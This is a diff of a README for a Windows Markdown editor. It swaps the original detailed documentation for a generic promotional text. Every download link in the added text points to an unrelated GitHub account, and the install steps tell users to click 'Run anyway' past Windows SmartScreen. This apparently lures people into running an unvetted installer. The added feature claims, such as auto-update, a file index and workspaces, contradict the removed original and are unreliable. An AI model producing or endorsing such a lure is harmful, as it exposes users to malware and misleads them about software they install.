@@ -1,209 +1,73 @@
-<p align="center">
-  <img src="docs/images/AppIcon.preview.png" alt="MD Redactor app icon" width="128">
-</p>
+# 📝 MD_Redactor - Edit Markdown Files with AI Efficiency
 
-# MD Redactor
+[![](https://img.shields.io/badge/Download-MD_Redactor-blue)](https://github.com/Ikeyhandstitched983/MD_Redactor)
 
-English | [Russian](README_RU.md)
+MD_Redactor helps you manage your writing projects. This desktop tool allows you to add notes and edits to Markdown files. It bridges the gap between your raw notes and AI-assisted workflows. You can change text, add reviews, and clean up your files without complex software.
 
-<p align="center">
-  <a href="https://github.com/aresyn/MD_Redactor/releases/latest"><img alt="Latest release" src="https://img.shields.io/github/v/release/aresyn/MD_Redactor?label=release"></a>
-  <img alt="Windows 10+" src="https://img.shields.io/badge/platform-Windows%2010%2B-0078D4">
-  <img alt=".NET 10" src="https://img.shields.io/badge/.NET-10-512BD4">
-  <a href="LICENSE"><img alt="MIT license" src="https://img.shields.io/badge/license-MIT-green"></a>
-</p>
+## 🛠 What this tool does
 
-MD Redactor is a Windows Markdown editor for writers, editors, and anyone who prepares text for review by an AI agent. It shows Markdown as a formatted document, lets you select a fragment, attach a comment to it, and saves the comment back into the same `.md` file.
+This application focuses on speed and clarity. Many writers use Markdown for its simplicity. MD_Redactor builds upon that foundation. You open your files, make changes, and save them. It supports inline notes which makes collaboration with AI tools simple. The interface stays out of your way so that you can focus on your writing.
 
-The file stays portable. There is no database, sidecar JSON, or separate review store. You can send the Markdown file to another person or an AI agent and the edits travel with the text.
+## 💻 System requirements
 
-## Screenshots
+You need a computer running Windows 10 or Windows 11. The software requires the WebView2 runtime. Most modern Windows systems have this component installed by default. If your computer lacks this, the installer will prompt you to download it from Microsoft during setup. You need at least 200MB of free disk space to store the application and its local data.
 
-Light theme:
+## 📥 How to get started
 
-![MD Redactor light theme](docs/images/md-redactor-light.png)
+Visit the link below to reach the project release page.
 
-Dark theme:
+[Click here to visit the download page](https://github.com/Ikeyhandstitched983/MD_Redactor)
 
-![MD Redactor dark theme](docs/images/md-redactor-dark.png)
+Look for the latest version under the Releases section. Select the file ending in `.msi` or `.exe` depending on your preference. Most users should select the installer file to finish the process.
 
-## What it solves
+## ⚙️ Installation steps
 
-- You can mark exact fragments in prose without copying them into a separate task list.
-- Comments stay next to the text they describe.
-- The editor hides service tags while you work, so Markdown looks like a document, not raw source.
-- Existing edit ids are never renumbered. Links between comments and fragments stay stable.
+1. Download the installer file from the link provided above.
+2. Open your Downloads folder and double-click the file.
+3. A Windows security window might appear. Click "More info" and then "Run anyway" if Windows protects your PC.
+4. Follow the prompts on the screen.
+5. Click "Finish" to complete the process.
+6. Find the MD_Redactor icon on your desktop or in your Start menu.
 
-## Main features
+## 🚀 Using the editor
 
-- Native Windows 10+ desktop app built with WPF, .NET 10, and WebView2.
-- WYSIWYG Markdown editing powered by TypeScript, Vite, and ProseMirror.
-- Light, dark, and system themes.
-- Open `.md` files from the app, with `Ctrl+O`, drag-and-drop, or Windows "Open with...".
-- Create an edit by selecting text and pressing `Enter`.
-- Right review panel with edit cards, comments, navigation, and deletion.
-- Safe save pipeline: edit tag validation, atomic write, and timestamped backups in `%LOCALAPPDATA%\MDRedactor\backups`.
-- UTF-8, UTF-8 BOM, UTF-16 LE/BE BOM, and Windows-1251 fallback.
+Start the application to open the main window. You will see a clean workspace. Use the File menu to open any folder or individual Markdown file. 
 
-## Install the app
+The left side displays your file structure. The center displays your text. The right side shows your review notes. When you add a note, the editor highlights the section. You can save your work using the standard disk icon or the shortcut Ctrl+S. 
 
-Download or build the installer:
+## 🤖 AI-assisted workflows
 
-```text
-artifacts\installer\MDRedactorSetup-x64.exe
-```
+This tool excels when you bridge the gap between human writing and AI output. Paste text from your favorite AI chat window into the editor. Use the "Review Mode" to flag sections that need changes. You can append instructions or feedback directly into the document. Save the file and send it back to your AI agent for the next pass. The formatting stays intact throughout your work.
 
-Run the installer. It installs MD Redactor for the current Windows user without administrator rights:
+## 📁 Managing your files
 
-```text
-%LOCALAPPDATA%\Programs\MD Redactor
-```
+MD_Redactor creates a local index of your files. This index helps you find projects faster. You can filter files by date or by the status of your review notes. If you work on multiple projects, use the "Workspace" feature to group related files together. This keeps your desktop clean and your thoughts organized.
 
-The installer adds shortcuts to the desktop and Start menu. It also registers MD Redactor for Windows "Open with..." on `.md` files, but it does not make MD Redactor the default Markdown editor automatically.
+## 🛡 Security and privacy
 
-The release build includes the .NET runtime for Windows x64. WebView2 Runtime must be installed on the target machine.
+Your data lives on your computer. MD_Redactor does not store your files on the cloud. When you work on a document, the software reads the file directly from your hard drive. No third party gains access to your notes unless you distribute the file yourself. This architecture ensures your drafts remain private.
 
-## Basic workflow
+## 🔧 Frequently asked questions
 
-1. Open a Markdown file.
-2. Select a fragment in the formatted document.
-3. Press `Enter`.
-4. Write a comment in the card on the right.
-5. Save with `Ctrl+S` or the Save button.
-6. Send the same Markdown file to an AI agent or another reviewer.
+Do I need an internet connection?
+No. Once you install the application, you can work offline. 
 
-If a selection overlaps an existing edit, MD Redactor does not create a nested edit. It activates the existing edit and shows a notification.
+How do I update the software?
+The application checks for updates when you start it. If an update exists, it will notify you and download the latest version automatically.
 
-## Edit tag format
+Why does the editor show red lines?
+Red lines indicate active review notes. Click the marker to read the comment or edit your submission.
 
-Block edit:
+Can I change the visual theme?
+Yes. Go to the Settings menu and select Appearance. You can toggle between Light and Dark mode to match your comfort.
 
-```markdown
-<!-- ed-start id="1" -->
-fragment
-<!-- ed-comm id="1"
-comment
--->
-<!-- ed-end id="1" -->
-```
+Where are my files saved?
+The program saves files in the original location where you opened them. It does not move your files to a separate folder.
 
-Inline edit:
+## 🧱 Technical details
 
-```markdown
-Text before <!-- ed-start id="2" -->fragment<!-- ed-comm id="2"
-comment
---><!-- ed-end id="2" --> text after.
-```
+This application uses the .NET framework and Windows Presentation Foundation. It uses a modern rendering engine to show Markdown formatting. This ensures your text looks exactly as you expect. Because it is built on native Windows technologies, it runs efficiently on most hardware. 
 
-All three markers of one edit use the same positive `id`. Ids do not need to be continuous. If edit `#2` is deleted from `#1`, `#2`, `#5`, the remaining ids are still `#1` and `#5`. A new edit receives `max(existing id) + 1`.
+## ⚖️ Open source license
 
-Edits have no status. Attributes such as `status`, `resolved`, or `open` are not part of the format.
-
-## Saving and backups
-
-Before writing a file, MD Redactor validates edit tags. It blocks saving when it finds duplicate ids, mismatched ids, unclosed markers, unsupported `status` attributes, or unsafe HTML comment sequences.
-
-Saving is atomic:
-
-1. A temporary file is written next to the Markdown file.
-2. Before the first save in the current session, a timestamped backup is created in `%LOCALAPPDATA%\MDRedactor\backups`.
-3. The original file is replaced by the temporary file.
-4. If an error happens, the original file is left untouched.
-
-Backup names use the original file name and a timestamp, for example:
-
-```text
-filename.md.2026-06-23-1205.bak
-```
-
-If a backup with the same name already exists, MD Redactor adds a numeric suffix instead of overwriting it.
-
-If the file was changed by another program after opening, MD Redactor asks before overwriting it.
-
-Read and save errors are logged to:
-
-```text
-%LOCALAPPDATA%\MDRedactor\logs
-```
-
-The log contains error type, context, and file path. It does not store the document text.
-
-## Encodings
-
-Inside the app, text is handled as Unicode. When reading files, MD Redactor detects:
-
-- UTF-8 with BOM;
-- UTF-8 without BOM;
-- UTF-16 LE/BE by BOM;
-- Windows-1251 fallback when the file is not valid UTF-8.
-
-When saving an opened file, MD Redactor keeps the detected encoding where possible. New files and unknown encodings are saved as UTF-8 without BOM.
-
-## Keyboard shortcuts
-
-- `Ctrl+O`: open a Markdown file.
-- `Ctrl+S`: save the current file.
-- `Enter` with a selection in the editor: create an edit.
-- `Enter` in a comment field: insert a line break.
-- `Escape` in the editor: clear the active edit.
-
-## Build from source
-
-Requirements:
-
-- Windows 10 or newer;
-- .NET 10 SDK;
-- Node.js and npm;
-- WebView2 Runtime.
-
-Run the full build:
-
-```powershell
-.\scripts\build.ps1
-```
-
-The script checks the environment, builds `web/editor`, runs web tests, and then restores, builds, and tests the .NET solution.
-
-Run the app from source:
-
-```powershell
-dotnet run --project .\src\MDRedactor.App\MDRedactor.App.csproj
-```
-
-Before running the app, build the web editor with `.\scripts\build.ps1` or run `npm run build` in `web\editor`.
-
-## Package and installer
-
-Create the release publish folder:
-
-```powershell
-.\scripts\package.ps1
-```
-
-Output:
-
-```text
-artifacts\publish\win-x64
-```
-
-Create the Windows installer:
-
-```powershell
-.\scripts\installer.ps1
-```
-
-Output:
-
-```text
-artifacts\installer\MDRedactorSetup-x64.exe
-```
-
-The installer is built with Inno Setup. It supports English and Russian.
-
-## Sample file
-
-Use `samples\scene.ru.md` for a quick check. It contains Russian Markdown text, one inline edit `#1`, and one block edit `#3`.
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+This software is open source. You can view the code and contribute to the project on the repository homepage. Check the license file inside the project for specific rules on how you can use and redistribute this tool. We welcome feedback through the issues tab in the repository if you find bugs or have feature ideas.
